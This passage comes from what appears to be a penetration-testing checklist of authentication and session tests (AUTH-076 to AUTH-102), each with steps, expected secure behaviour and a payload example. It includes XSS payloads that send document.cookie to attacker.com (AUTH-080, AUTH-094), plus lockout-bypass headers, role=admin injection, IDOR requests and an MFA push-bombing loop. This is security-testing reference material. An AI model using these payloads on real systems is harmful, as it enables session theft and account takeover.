**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-076 — OTP Length and Complexity Check
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP 2. Check OTP length (should be minimum 6 digits) 3. Check if OTP is numeric only or alphanumeric 4. Analyze randomness

**Expected Result:** OTP should be minimum 6 digits cryptographically random with appropriate entropy

**Payload Example:**

```
Analyze multiple OTPs for patterns and length
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Manual Testing / Burp Sequencer

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-077 — Remember Me Token Predictability
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Remember Me - Remember-me persistent cookie / token

**Test Steps:** 1. Login with Remember Me enabled 2. Capture persistent cookie/token 3. Analyze entropy and randomness 4. Request multiple and check patterns

**Expected Result:** Remember Me token should be cryptographically random and unpredictable

**Payload Example:**

```
Collect 50 remember-me tokens and analyze with Sequencer
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Sequencer / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-078 — Remember Me Token Not Invalidated on Password Change
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Remember Me - Remember-me persistent cookie / token

**Test Steps:** 1. Login with Remember Me 2. Capture remember-me token 3. Change password from another session 4. Try using old remember-me token

**Expected Result:** Remember Me tokens should be invalidated when password is changed

**Payload Example:**

```
Use old remember_me cookie after password change
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-079 — Remember Me Cookie Security Flags
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Remember Me - Remember-me persistent cookie / token

**Test Steps:** 1. Login with Remember Me 2. Inspect persistent cookie 3. Check for HttpOnly Secure SameSite flags 4. Check expiry duration

**Expected Result:** Remember Me cookie should have HttpOnly Secure SameSite=Lax/Strict flags with reasonable expiry

**Payload Example:**

```
Check Set-Cookie header for missing flags
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-080 — Remember Me XSS Token Theft
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Remember Me - Remember-me persistent cookie / token

**Test Steps:** 1. Find XSS vulnerability 2. Craft payload to steal remember-me cookie 3. Check if HttpOnly flag prevents JavaScript access

**Expected Result:** Remember Me cookies should be HttpOnly to prevent theft via XSS

**Payload Example:**

```
<script>document.location='https://attacker.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSStrike

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AUTH-081 — Account Lockout Denial of Service
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Lockout - Login lockout counter / rate-limit

**Test Steps:** 1. Attempt multiple failed logins for victim account 2. Check if account gets locked 3. Victim is unable to login 4. Test lockout duration and reset mechanism

**Expected Result:** Account lockout should be temporary with progressive delays not permanent lockout

**Payload Example:**

```
Send 20 failed login attempts for victim@target.com
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Intruder / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## AUTH-082 — Account Lockout Bypass via Case Variation
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Lockout - Login lockout counter / rate-limit

**Test Steps:** 1. Attempt failed logins with user@test.com 2. After lockout try User@test.com USER@test.com 3. Check if case variation resets lockout counter

**Expected Result:** Lockout mechanism should be case-insensitive and normalize usernames

**Payload Example:**

```
user@test.com|User@test.com|USER@TEST.COM|uSer@Test.Com
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-083 — Account Lockout Bypass via IP Change
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Lockout - Login lockout counter / rate-limit

**Test Steps:** 1. Trigger account lockout from IP A 2. Switch to IP B or add X-Forwarded-For header 3. Continue login attempts

**Expected Result:** Lockout should be per-account not per-IP and resistant to IP-based bypass

**Payload Example:**

```
X-Forwarded-For: 127.0.0.1|Use VPN/proxy to change IP
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / VPN / Proxy chains

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-084 — Lockout Counter Reset Testing
**Test Category:** Broken Authentication · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Lockout - Login lockout counter / rate-limit

**Test Steps:** 1. Make N-1 failed attempts (just below lockout threshold) 2. Make one successful login 3. Check if failure counter resets 4. Make N-1 more failed attempts

**Expected Result:** Successful login should reset failure counter but mechanism should resist slow brute force

**Payload Example:**

```
4 failed attempts then 1 success then 4 more failed attempts
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-085 — Trusted Device Token Manipulation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Device Management - Trusted-device tokens / device list (userId param)

**Test Steps:** 1. Login and trust device 2. Capture trusted device token/cookie 3. Transfer token to different device 4. Check if 2FA is bypassed

**Expected Result:** Trusted device tokens should be bound to device fingerprint and not transferable

**Payload Example:**

```
Copy trusted_device cookie to different browser/machine
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-086 — Device List IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Device Management - Trusted-device tokens / device list (userId param)

**Test Steps:** 1. Login and view device list 2. Capture API request for device management 3. Modify device_id or user_id 4. Try accessing or removing other users devices

**Expected Result:** Device management should validate device ownership before allowing any operations

**Payload Example:**

```
GET /api/devices?user_id=OTHER_USER|DELETE /api/devices/OTHER_DEVICE_ID
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AUTH-087 — Bypass Device Limit
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Device Management - Trusted-device tokens / device list (userId param)

**Test Steps:** 1. Login from maximum allowed devices 2. Try logging from additional device 3. Check if limit is enforced 4. Try bypassing via API manipulation

**Expected Result:** Application should enforce maximum device limit and require logging out from existing device

**Payload Example:**

```
Login from 6th device when limit is 5|Modify device count parameter
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Multiple Browsers / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-088 — Biometric Fallback Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Biometric Authentication - Biometric auth fallback / local credential storage

**Test Steps:** 1. Enable biometric authentication 2. Trigger biometric prompt 3. Cancel biometric and check if fallback to PIN/password exists 4. Test fallback security

**Expected Result:** Biometric fallback should require strong alternative authentication not weaker PIN

**Payload Example:**

```
Cancel fingerprint prompt and try PIN 0000|Cancel and check if session granted
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Mobile Device / Frida / Objection

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-089 — Biometric Data Storage Analysis
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Biometric Authentication - Biometric auth fallback / local credential storage

**Test Steps:** 1. Enable biometric auth 2. Examine local storage for biometric keys 3. Check if biometric token is stored securely 4. Check KeyStore/Keychain usage

**Expected Result:** Biometric credentials should use platform secure storage (KeyStore/Keychain) not plain storage

**Payload Example:**

```
Check SharedPreferences|SQLite|local files for biometric tokens
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Frida / Objection / Mobile Testing Tools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-090 — Privilege Escalation via Role Parameter
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Registration - Registration role / privilege parameters

**Test Steps:** 1. Capture registration request 2. Add or modify role parameter to admin/privileged role 3. Submit modified request 4. Login and check assigned role

**Expected Result:** Application should assign roles server-side based on business logic not user-supplied parameters

**Payload Example:**

```
{"username":"test"password:"test123"role:"admin"}|role=superadmin
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite  /  Postman

**References:** CWE-840; PortSwigger Business logic

---

## AUTH-091 — Role Enumeration via Registration
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Registration - Registration role / privilege parameters

**Test Steps:** 1. Try registering with various role values 2. Check error messages for valid role names 3. Analyze API documentation or source code

**Expected Result:** Application should not reveal available role names through error messages

**Payload Example:**

```
role=admin|role=moderator|role=superuser|role=manager and check error differences
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AUTH-092 — Registration Restriction Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Registration - Registration role / privilege parameters

**Test Steps:** 1. If certain roles require invitation/approval try direct API registration 2. Bypass frontend restrictions 3. Manipulate invitation tokens

**Expected Result:** Registration restrictions should be enforced server-side not just on frontend

**Payload Example:**

```
POST /api/register with admin role directly bypassing UI restrictions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AUTH-093 — Session ID Entropy Analysis
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Collect multiple session IDs 2. Analyze randomness and entropy using Burp Sequencer 3. Check for patterns or predictability

**Expected Result:** Session IDs should have minimum 128-bit entropy and be cryptographically random

**Payload Example:**

```
Collect 10000+ session tokens and run Sequencer analysis
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Sequencer

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-094 — Session Hijacking via XSS
**Test Category:** Cross-Site Scripting · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Find XSS vulnerability 2. Craft payload to steal session cookie 3. Check if session cookie has HttpOnly flag 4. Test session token theft

**Expected Result:** Session cookies should have HttpOnly flag preventing JavaScript access

**Payload Example:**

```
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSStrike / BeEF

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AUTH-095 — Concurrent Session Handling
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Login from browser A 2. Login from browser B with same credentials 3. Check if first session is invalidated 4. Test session limit

**Expected Result:** Application should enforce concurrent session policies based on security requirements

**Payload Example:**

```
Login from Chrome and Firefox simultaneously
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Multiple Browsers / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-096 — Session Cookie Scope Analysis
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Examine session cookie domain and path attributes 2. Check if cookie scope is too broad 3. Check for wildcard domain 4. Test subdomain access

**Expected Result:** Session cookies should have minimal scope with specific domain and path

**Payload Example:**

```
Check Domain=.example.com (too broad) vs Domain=app.example.com
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-097 — Absolute Session Timeout Testing
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Login and note timestamp 2. Keep session active with periodic requests 3. Check if session expires after absolute timeout regardless of activity

**Expected Result:** Application should enforce absolute session timeout (e.g. 8-24 hours) even for active sessions

**Payload Example:**

```
Keep session active for 24+ hours and check if forced re-authentication occurs
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-098 — Idle Session Timeout Testing
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Session Management - Session ID / cookie flags / timeout lifecycle

**Test Steps:** 1. Login and remain idle 2. Wait for different periods (15min 30min 1hr) 3. Try accessing protected resource after idle period

**Expected Result:** Application should expire idle sessions after appropriate period (15-30 minutes for sensitive apps)

**Payload Example:**

```
Access /api/profile after 30 minutes of inactivity
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-099 — Pre-account takeover (seed victim email before registration)
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration / social-login for an email the victim has not yet registered

**Test Steps:** 1. Register (or social-link) an account using the victim's email before they sign up<br>2. Set a password / link your identity<br>3. When the victim later 'registers' or logs in via SSO, they inherit your controlled account<br>4. Confirm you retain access to their data/session

**Expected Result:** Email ownership verified before account is usable; existing unverified account is not silently merged

**Payload Example:**

```
POST /register {email: victim@corp.com, password: attacker}  (pre-registration)
```

**Impact:** Pre-account takeover -&gt; attacker controls the account the victim later uses -&gt; ATO

**Tools:** Burp

**References:** CWE-640; CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed pre-ATO writeups

---

## AUTH-100 — MFA fatigue / push-bombing
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push-based MFA approval prompt

**Test Steps:** 1. With valid/phished creds, repeatedly trigger the MFA push to the victim<br>2. Fire many approval prompts (optionally with a support pretext)<br>3. Victim approves out of fatigue<br>4. Attacker session granted

**Expected Result:** Number-matching + limited attempts + velocity throttle on push approvals

**Payload Example:**

```
loop: POST /mfa/push until approved
```

**Impact:** MFA fatigue -&gt; victim approves attacker login -&gt; ATO despite MFA

**Tools:** Burp Intruder

**References:** CWE-287; CWE-1390; -&gt;[Account Takeover checklist](#/checklist/ato); NIST 800-63B; push-fatigue incident writeups

---

## AUTH-101 — WebAuthn / passkey fallback bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebAuthn/passkey registration &amp; recovery flow

**Test Steps:** 1. Check for an always-available weaker fallback (SMS/OTP/password)<br>2. Try registering an attacker authenticator via IDOR/CSRF<br>3. Abuse recovery to downgrade from passkey to password<br>4. Log in with the attacker factor

**Expected Result:** Recovery requires step-up; credential registration bound + re-authenticated; no silent downgrade

**Payload Example:**

```
POST /webauthn/credentials {attacker attestation} on victim session
```

**Impact:** Passkey/WebAuthn bypass -&gt; ATO despite phishing-resistant factor

**Tools:** Burp, virtual authenticator

**References:** CWE-287; CWE-308; -&gt;[Account Takeover checklist](#/checklist/ato); W3C WebAuthn spec; FIDO2

---

## AUTH-102 — OAuth / social account-linking abuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account-linking endpoint (link social/OAuth to an existing account)

**Test Steps:** 1. Link an attacker OAuth identity to a victim account (control the email/sub) or pre-link<br>2. Confirm the linking endpoint lacks ownership proof / state<br>3. Victim's social login lands in the linked account<br>4. Prove cross-account access

**Expected Result:** Linking verifies ownership of both identities + re-auth; email_verified enforced; state/CSRF token

**Payload Example:**

```
POST /account/link {provider:google, email:victim@x}   (no ownership proof / no state)
```

**Impact:** Account-linking abuse -&gt; attacker identity bound to victim account -&gt; ATO

**Tools:** Burp

**References:** CWE-287; CWE-352; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); PortSwigger OAuth; disclosed linking-ATO writeups

---
